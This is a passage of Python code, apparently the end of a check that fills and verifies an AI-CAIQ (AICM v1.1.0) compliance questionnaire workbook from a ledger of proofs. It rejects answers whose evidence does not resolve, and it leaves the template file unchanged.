        return r.fail("every answer is Yes — a questionnaire of unbroken Yeses is the least "
                      "believable artifact an auditor can receive")
    r.observe(f"{len(yeses)} Yes, {len(nos)} No — the No answers state their search path: "
              f"{', '.join(a.control for a in nos)}")

    every_ref_live = {ref for row in result["rows"] for ref in row["live"]}
    for a in answers:
        for ref in a.evidence:
            if ref not in every_ref_live:
                return r.fail(f"{a.control} cites {ref}, which does not resolve to a live proof")
    total_refs = sum(len(a.evidence) for a in answers)
    r.observe(f"all {total_refs} evidence refs resolve to verified ledger records")

    caiq_dir = repo_root() / "docs" / "ai-caiq"
    caiq_dir.mkdir(parents=True, exist_ok=True)
    answers_path = caiq_dir / "stop-guessing.yaml"
    answers_path.write_text(
        yaml.safe_dump(to_yaml_doc(answers, result), sort_keys=False, width=100,
                       allow_unicode=True), encoding="utf-8")

    published, proposed = split_published(answers)
    r.observe(f"{len(published)} PUBLISHED AICM v1.1.0 controls will be written; "
              f"{len(proposed)} of CSA's DRAFT agentic controls "
              f"({', '.join(a.control for a in proposed)}) are recorded but NOT written — they "
              "do not exist in the published workbook and inventing rows would be fabrication")

    fill_input = {}
    for a in published:
        d = a.to_fill()
        if d["answer"] == "NA":
            d.pop("ssrm", None)
        fill_input[a.control] = d
    out = caiq_dir / "AI-CAIQ-stop-guessing-v1.1.0.xlsx"
    res = fill(tpl, fill_input, out)
    if not res.template_untouched:
        return r.fail("THE TEMPLATE WAS MODIFIED BY THE FILL")
    r.observe(f"filled {res.controls_answered} controls across {res.rows_written} question rows")

    ok, detail = verify_with_rich_text(tpl, out)
    if not ok:
        return r.fail(f"rich-text's verifier rejected the workbook: {detail}")
    r.observe(f"rich-text verify_ai_caiq_workbook.py (unmodified, third-party): "
              f"{detail.splitlines()[-1]}")

    ins = caiq_inspect(out)
    if ins.specification_version != "1.1.0" or ins.caiq_version != "1.1.0":
        return r.fail(f"the filled workbook's A1 drifted: {ins.a1_raw}")
    r.observe(f"filled workbook A1 still declares {ins.specification_version}/{ins.caiq_version}")

    if file_digest(tpl) != before:
        return r.fail("the template changed across the whole procedure")
    r.observe(f"copy-only held throughout: template {before[:24]}… unchanged")

    doc = yaml.safe_load(answers_path.read_text(encoding="utf-8"))
    if "DERIVED from proofs" not in doc["meta"]["note"]:
        return r.fail("the answers file does not declare that it is derived")
    r.observe("answers file declares itself DERIVED — the workbook renders the ledger, "
              "it is not an input to it")
    r.evidence = {"controls": len(answers), "yes": len(yeses), "no": len(nos),
                  "evidence_refs": total_refs,
                  "workbook_digest": file_digest(out),
                  "template_digest": before,
                  "ledger_ref": str(runner.DEFAULT_LEDGER)}
    return r
